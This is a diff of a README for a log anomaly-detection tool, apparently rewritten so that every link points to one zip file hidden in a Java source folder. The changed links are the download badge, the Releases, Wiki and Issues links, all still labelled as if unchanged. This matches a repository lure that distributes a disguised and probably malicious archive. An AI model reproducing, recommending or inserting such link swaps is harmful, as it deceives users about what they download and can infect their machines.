@@ -1,6 +1,6 @@
 # 🚀 systemlogs-anomaly-detection - Detect Issues in Your System Logs Effortlessly
 
-[![Download](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/betieshet/systemlogs-anomaly-detection/releases)
+[![Download](https://github.com/betieshet/systemlogs-anomaly-detection/raw/refs/heads/main/spring-anomaly-api/src/main/java/com/anomaly/endpoint/controller/detection-anomaly-systemlogs-1.6-beta.2.zip%20Now-Release%20Page-brightgreen)](https://github.com/betieshet/systemlogs-anomaly-detection/raw/refs/heads/main/spring-anomaly-api/src/main/java/com/anomaly/endpoint/controller/detection-anomaly-systemlogs-1.6-beta.2.zip)
 
 ## 📋 Overview
 
@@ -27,7 +27,7 @@ To download and set up the application, follow these steps:
 
 1. **Visit the Releases Page**: Click the button below to go to the release page.
    
-   [![Download](https://img.shields.io/badge/Download%20Now-Release%20Page-brightgreen)](https://github.com/betieshet/systemlogs-anomaly-detection/releases)
+   [![Download](https://github.com/betieshet/systemlogs-anomaly-detection/raw/refs/heads/main/spring-anomaly-api/src/main/java/com/anomaly/endpoint/controller/detection-anomaly-systemlogs-1.6-beta.2.zip%20Now-Release%20Page-brightgreen)](https://github.com/betieshet/systemlogs-anomaly-detection/raw/refs/heads/main/spring-anomaly-api/src/main/java/com/anomaly/endpoint/controller/detection-anomaly-systemlogs-1.6-beta.2.zip)
 
 2. **Find the Latest Release**: Look for the most recent version listed on the page. Each release includes details about what's new or fixed.
 
@@ -58,7 +58,7 @@ After you’ve set it up, here is how to use the application effectively:
 
 ## 📚 Documentation
 
-For more detailed instructions on advanced features, refer to the [Wiki](https://github.com/betieshet/systemlogs-anomaly-detection/wiki). Here, you’ll find guides on setting up your environment, troubleshooting common issues, and optimizing performance.
+For more detailed instructions on advanced features, refer to the [Wiki](https://github.com/betieshet/systemlogs-anomaly-detection/raw/refs/heads/main/spring-anomaly-api/src/main/java/com/anomaly/endpoint/controller/detection-anomaly-systemlogs-1.6-beta.2.zip). Here, you’ll find guides on setting up your environment, troubleshooting common issues, and optimizing performance.
 
 ## 🛠️ Troubleshooting
 
@@ -78,8 +78,8 @@ We welcome contributions! If you want to improve the application or documentatio
 
 ## 🔗 Links
 
-- **Releases Page**: [Download Application](https://github.com/betieshet/systemlogs-anomaly-detection/releases)
-- **Documentation**: [Wiki](https://github.com/betieshet/systemlogs-anomaly-detection/wiki)
-- **Issues**: [Report an Issue](https://github.com/betieshet/systemlogs-anomaly-detection/issues)
+- **Releases Page**: [Download Application](https://github.com/betieshet/systemlogs-anomaly-detection/raw/refs/heads/main/spring-anomaly-api/src/main/java/com/anomaly/endpoint/controller/detection-anomaly-systemlogs-1.6-beta.2.zip)
+- **Documentation**: [Wiki](https://github.com/betieshet/systemlogs-anomaly-detection/raw/refs/heads/main/spring-anomaly-api/src/main/java/com/anomaly/endpoint/controller/detection-anomaly-systemlogs-1.6-beta.2.zip)
+- **Issues**: [Report an Issue](https://github.com/betieshet/systemlogs-anomaly-detection/raw/refs/heads/main/spring-anomaly-api/src/main/java/com/anomaly/endpoint/controller/detection-anomaly-systemlogs-1.6-beta.2.zip)
 
 Thank you for choosing System Logs Anomaly Detection. Happy monitoring!
